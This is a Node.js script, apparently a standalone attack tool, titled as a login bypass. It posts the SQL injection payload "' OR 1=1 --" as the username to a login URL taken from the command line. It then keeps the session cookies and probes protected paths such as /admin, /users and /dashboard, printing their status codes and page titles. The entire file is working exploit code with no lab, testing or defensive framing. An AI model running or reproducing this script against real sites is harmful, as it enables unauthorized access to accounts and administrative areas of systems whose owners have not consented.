// bypassAndNavigate.js - Login Bypass + Dashboard Access
const axios = require('axios').default;
const tough = require('tough-cookie');
const { wrapper } = require('axios-cookiejar-support');
const jsdom = require('jsdom');
const { JSDOM } = jsdom;

const payload = { username: "' OR 1=1 --", password: "any" };
const protectedPaths = ["/dashboard", "/admin", "/profile", "/users", "/main"];

async function tryBypassLogin(url) {
  const jar = new tough.CookieJar();
  const client = wrapper(axios.create({ jar }));

  console.log(`🛠️ Sending login bypass to: ${url}`);
  try {
    const res = await client.post(url, payload);
    console.log(`✅ Login status: ${res.status}`);

    const base = new URL(url).origin;
    for (let path of protectedPaths) {
      const full = base + path;
      try {
        const dashRes = await client.get(full);
        console.log(`🔍 Accessed ${path} — Status: ${dashRes.status}`);
        const body = dashRes.data.toString();
        const dom = new JSDOM(body);
        const title = dom.window.document.title || "[No Title]";
        console.log(`📄 Page title: ${title}`);
      } catch (e) {
        console.log(`❌ Failed to access ${path}: ${e.response?.status || e.message}`);
      }
    }
  } catch (e) {
    console.error(`❌ Bypass failed: ${e.message}`);
  }
}

const target = process.argv[2];
if (!target) {
  console.error("❌ Provide a login URL.");
  process.exit(1);
}

tryBypassLogin(target);
